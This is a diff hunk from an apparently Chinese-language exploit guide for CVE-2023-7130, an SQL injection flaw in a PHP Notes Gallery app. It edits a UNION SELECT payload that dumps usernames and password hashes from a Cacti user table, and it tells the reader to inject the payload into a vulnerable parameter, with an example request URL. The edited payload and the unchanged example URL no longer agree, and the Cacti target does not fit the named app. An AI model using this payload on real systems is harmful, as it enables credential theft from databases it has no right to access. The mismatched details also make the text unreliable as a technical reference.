@@ -31,7 +31,7 @@ CVE-2023-7130 是一个 PHP Notes Gallery 应用，存在 SQL 注入漏洞。尽
     **示例 SQL 注入Payload (假设存在 UNION 注入点，并且目标数据库为 `cacti`，且存在 `user_auth` 表):**
 
     ```
-    ' UNION SELECT 1,2,concat(id,0x23,username,0x23,password) FROM cacti.user_auth -- -
+    ' UNION SELECT 1,2,concat(username,0x23,password) FROM cacti_user -- -
     ```
     将其插入到你发现的 SQL 注入参数中。例如，如果 `id` 参数存在漏洞，则请求可能类似于：
     `http://your-ip:9000/vulnerable_page.php?id=1' UNION SELECT 1,2,concat(id,0x23,username,0x23,password) FROM cacti.user_auth -- -`
